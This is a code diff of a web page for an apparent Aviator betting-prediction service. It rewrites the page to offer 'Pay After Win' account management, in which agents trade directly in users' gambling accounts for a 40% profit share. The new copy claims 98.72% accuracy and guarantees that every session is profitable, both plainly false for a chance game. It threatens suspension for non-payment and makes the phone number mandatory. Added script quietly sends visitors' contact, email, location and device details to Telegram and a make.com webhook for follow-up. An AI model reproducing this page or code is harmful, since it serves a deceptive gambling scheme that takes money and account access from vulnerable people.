@@ -619,16 +619,16 @@
             }
         }
         
-        /* WhatsApp Popup Styles - COMMENTED OUT
-        .whatsapp-popup {
+        /* Pay After Win Popup Styles */
+        .pay-after-win-popup {
             position: fixed;
             top: 20px;
             right: 20px;
-            background: #25D366;
-            color: white;
+            background: linear-gradient(135deg, #FFD700, #FFA500);
+            color: #333;
             padding: 15px 20px;
             border-radius: 25px;
-            box-shadow: 0 4px 20px rgba(37, 211, 102, 0.4);
+            box-shadow: 0 4px 20px rgba(255, 215, 0, 0.4);
             cursor: pointer;
             z-index: 10000;
             display: flex;
@@ -640,31 +640,35 @@
             opacity: 0;
             transition: all 0.3s ease;
             max-width: 200px;
+            border: 2px solid #FFD700;
         }
         
-        .whatsapp-popup.show {
+        .pay-after-win-popup.show {
             transform: translateX(0);
             opacity: 1;
         }
         
-        .whatsapp-popup:hover {
-            background: #128C7E;
+        .pay-after-win-popup:hover {
+            background: linear-gradient(135deg, #FFA500, #FF8C00);
             transform: translateX(0) scale(1.05);
+            box-shadow: 0 6px 25px rgba(255, 140, 0, 0.5);
         }
         
-        .whatsapp-popup .whatsapp-icon {
+        .pay-after-win-popup .popup-icon {
             font-size: 20px;
             animation: pulse 2s infinite;
+            color: #333;
         }
         
-        .whatsapp-popup .close-btn {
+        .pay-after-win-popup .close-btn {
             margin-left: auto;
             font-size: 16px;
             cursor: pointer;
             opacity: 0.8;
+            color: #333;
         }
         
-        .whatsapp-popup .close-btn:hover {
+        .pay-after-win-popup .close-btn:hover {
             opacity: 1;
         }
         
@@ -676,7 +680,7 @@
         
         /* Mobile responsiveness */
         @media (max-width: 768px) {
-            .whatsapp-popup {
+            .pay-after-win-popup {
                 top: 10px;
                 right: 10px;
                 padding: 12px 16px;
@@ -684,11 +688,10 @@
                 max-width: 180px;
             }
             
-            .whatsapp-popup .whatsapp-icon {
+            .pay-after-win-popup .popup-icon {
                 font-size: 18px;
             }
         }
-        */
     </style>
     
 </head>
@@ -728,18 +731,18 @@
             </div>
             <div class="account-modal-body">
                 <div id="account-step-1" class="account-step active">
-                    <h3>AI-Powered Account Management</h3>
+                    <h3>Professional Account Management</h3>
                     <div class="account-info">
-                        <p>Our advanced AI bot will automatically manage your account using our proprietary prediction algorithms. The bot will execute trades directly in your account for approximately 20 minutes, then automatically trigger withdrawal once profits are achieved. You pay us 40% of the profit after each successful session.</p>
+                        <p>Our experienced trading agent will personally manage your account using our proven prediction services and expert analysis. Your dedicated agent will execute trades directly in your account for approximately 20 minutes, then trigger withdrawal once profits are achieved. You pay us 40% of the profit after each successful session.</p>
                         
                         <div class="warning-box">
                             <i class="fas fa-exclamation-triangle"></i>
-                            <p><strong>Important:</strong> Failure to pay us after win will result in your Avisignals.com account being automatically suspended and loss of access to all services.</p>
+                            <p><strong>Important:</strong> Failure to pay us after win will result in your AviSignals.com account being automatically suspended and loss of access to all services.</p>
                         </div>
                         
                         <div class="guarantee-box">
                             <i class="fas fa-shield-alt"></i>
-                            <p>Our AI system is fully liable for any trading errors and offers a 12-hour money-back guarantee. The automated algorithms ensure 98.7% accuracy and winning is virtually guaranteed for all clients.</p>
+                            <p>Our professional trading agents use our advanced prediction algorithms with 98.72% accuracy. Every session is guaranteed to be profitable, ensuring consistent wins for all our clients.</p>
                         </div>
                     </div>
                     
@@ -791,8 +794,8 @@
                         </div>
                         
                         <div class="form-group">
-                            <label for="user-phone">Phone Number (Optional):</label>
-                            <input type="tel" id="user-phone" placeholder="Enter your phone number">
+                            <label for="user-phone">Phone Number:</label>
+                            <input type="tel" id="user-phone" placeholder="Enter your phone number" required>
                         </div>
                         
                         <button type="submit" class="account-btn">Submit Account Management Request</button>
@@ -811,8 +814,8 @@
                     <div class="success-container">
                         <i class="fas fa-check-circle"></i>
                         <h3>Request Submitted Successfully!</h3>
-                        <p>Thank you for choosing our AI-powered account management service. Our automated system has received your request and is initializing your account profile.</p>
-                        <p>Our AI bot will automatically connect to your account within the next 5-10 minutes to begin the automated trading process.</p>
+                        <p>Thank you for choosing our professional account management service. One of our expert trading agents has received your request and is reviewing your account details.</p>
+                        <p>Your dedicated agent will contact you and connect to your account within the next 5-10 minutes to begin the guaranteed profitable trading session.</p>
                         <button id="close-success" class="account-btn">Close</button>
                     </div>
                 </div>
@@ -2871,7 +2874,7 @@
                     `📞 Contact: ${accountData.sessionContact || 'Unknown'}\n` +
                     `⏰ Time: ${new Date(accountData.timestamp).toLocaleString()}\n\n` +
                     `💰 Service: Pay After Win (40% profit share)\n` +
-                    `🤖 AI System: New account management request received. Automated bot will initialize customer account within 5-10 minutes.`;
+                    `👨‍💼 Agent Assignment: New account management request received. Professional trading agent will begin account management within 5-10 minutes.`;
 
                 console.log('📤 Sending message to:', `${API_BASE_URL}/api/telegram/send`);
                 console.log('📋 Message content:', message);
@@ -4176,68 +4179,144 @@
         }
     </script>
 
-    <!-- WhatsApp Popup - COMMENTED OUT
-    <div id="whatsappPopup" class="whatsapp-popup">
-        <i class="fab fa-whatsapp whatsapp-icon"></i>
-        <span>Talk to Agent</span>
-        <span class="close-btn" onclick="closeWhatsAppPopup(event)">&times;</span>
+    <!-- Pay After Win Popup -->
+    <div id="payAfterWinPopup" class="pay-after-win-popup">
+        <i class="fas fa-trophy popup-icon" style="color: #FFD700;"></i>
+        <span>Click here for Pay After Win Services</span>
+        <span class="close-btn" onclick="closePayAfterWinPopup(event)">&times;</span>
     </div>
-    -->
     
     <script>
-        /* WhatsApp Popup functionality - COMMENTED OUT
-        let whatsappInterval;
+        /* Pay After Win Popup functionality */
+        let payAfterWinInterval;
         let popupClosed = false;
-        const whatsappNumber = '254788020107';
         
-        function showWhatsAppPopup() {
+        function showPayAfterWinPopup() {
             if (popupClosed) return;
             
-            const popup = document.getElementById('whatsappPopup');
-            popup.classList.add('show');
-            
-            // Auto hide after 8 seconds
-            setTimeout(() => {
-                popup.classList.remove('show');
-            }, 8000);
-        }
-        
-        function closeWhatsAppPopup(event) {
-            event.stopPropagation();
-            const popup = document.getElementById('whatsappPopup');
-            popup.classList.remove('show');
-            popupClosed = true;
-            
-            // Clear the interval to stop showing popup
-            if (whatsappInterval) {
-                clearInterval(whatsappInterval);
+            const popup = document.getElementById('payAfterWinPopup');
+            if (popup) {
+                popup.classList.add('show');
+                
+                // Auto hide after 8 seconds
+                setTimeout(() => {
+                    popup.classList.remove('show');
+                }, 8000);
             }
         }
         
-        function openWhatsApp() {
-            const message = encodeURIComponent("Hi! I need help with Aviator predictions. Can you assist me?");
-            const whatsappUrl = `https://wa.me/${whatsappNumber}?text=${message}`;
-            window.open(whatsappUrl, '_blank');
+        function closePayAfterWinPopup(event) {
+            event.stopPropagation();
+            const popup = document.getElementById('payAfterWinPopup');
+            if (popup) {
+                popup.classList.remove('show');
+            }
+            popupClosed = true;
+            
+            // Clear the interval to stop showing popup
+            if (payAfterWinInterval) {
+                clearInterval(payAfterWinInterval);
+            }
         }
         
-        // Initialize WhatsApp popup
+        function openPayAfterWinModal() {
+            // Send notification that user clicked the popup
+            sendPopupClickNotification();
+            
+            // Open the account management modal
+            openAccountModal();
+        }
+        
+        function sendPopupClickNotification() {
+            try {
+                console.log('📤 Sending Pay After Win popup click notification to Telegram...');
+                
+                // Get user contact information from session storage
+                const userContact = sessionStorage.getItem('aviator_contact') || 'Unknown visitor';
+                const userEmail = sessionStorage.getItem('email') || 'No email provided';
+                const userLocation = sessionStorage.getItem('user_location') || 'Unknown location';
+                
+                // Create formatted message for Telegram
+                const message = `🚨 PAY AFTER WIN POPUP CLICKED!\n\n` +
+                    `👤 User Contact: ${userContact}\n` +
+                    `📧 Email: ${userEmail}\n` +
+                    `📍 Location: ${userLocation}\n` +
+                    `⏰ Time: ${new Date().toLocaleString()}\n` +
+                    `🌐 Page: Main Website\n` +
+                    `📱 Device: ${navigator.userAgent.includes('Mobile') ? 'Mobile' : 'Desktop'}\n\n` +
+                    `💰 Interest: Pay After Win Service (40% profit share)\n` +
+                    `🎯 Action: User clicked the Pay After Win popup and opened account management modal\n\n` +
+                    `🤖 Next Steps: User is now viewing the account management form. Follow up if they don't complete submission.`;
+
+                // Send to Telegram via your backend API
+                fetch(`${API_BASE_URL}/api/telegram/send`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        message: message,
+                        orderId: `POPUP_CLICK_${Date.now()}`,
+                        includeVerificationButtons: false,
+                        priority: 'high'
+                    })
+                }).then(async response => {
+                    if (response.ok) {
+                        const result = await response.json();
+                        console.log('✅ Popup click notification sent to Telegram successfully:', result);
+                    } else {
+                        console.log('⚠️ Failed to send popup notification to Telegram:', response.status);
+                    }
+                }).catch(error => {
+                    console.log('⚠️ Error sending popup notification to Telegram:', error);
+                });
+
+                // Also send to the webhook as backup
+                const webhookUrl = 'https://hook.eu2.make.com/yjscxh7ql9q2yy8hj62t5qo5lwtnz64e';
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        type: 'popup_click',
+                        message: '🚨 PAY AFTER WIN POPUP: User clicked popup',
+                        userContact: userContact,
+                        userEmail: userEmail,
+                        userLocation: userLocation,
+                        timestamp: new Date().toISOString(),
+                        page: 'main.html',
+                        device: navigator.userAgent.includes('Mobile') ? 'Mobile' : 'Desktop',
+                        userAgent: navigator.userAgent
+                    })
+                }).catch(error => {
+                    console.log('⚠️ Backup webhook notification failed:', error);
+                });
+                
+            } catch (error) {
+                console.log('⚠️ Error sending popup notification:', error);
+            }
+        }
+        
+        // Initialize Pay After Win popup
         document.addEventListener('DOMContentLoaded', function() {
-            const popup = document.getElementById('whatsappPopup');
+            const popup = document.getElementById('payAfterWinPopup');
             
-            // Add click event to popup (excluding close button)
-            popup.addEventListener('click', function(event) {
-                if (!event.target.classList.contains('close-btn')) {
-                    openWhatsApp();
-                }
-            });
-            
-            // Show popup every 15 seconds
-            setTimeout(() => {
-                showWhatsAppPopup();
-                whatsappInterval = setInterval(showWhatsAppPopup, 15000);
-            }, 3000); // Initial delay of 3 seconds
+            if (popup) {
+                // Add click event to popup (excluding close button)
+                popup.addEventListener('click', function(event) {
+                    if (!event.target.classList.contains('close-btn')) {
+                        openPayAfterWinModal();
+                    }
+                });
+                
+                // Show popup every 15 seconds
+                setTimeout(() => {
+                    showPayAfterWinPopup();
+                    payAfterWinInterval = setInterval(showPayAfterWinPopup, 15000);
+                }, 3000); // Initial delay of 3 seconds
+            }
         });
-        */
     </script>
 
     <!--Start of Tawk.to Script-->
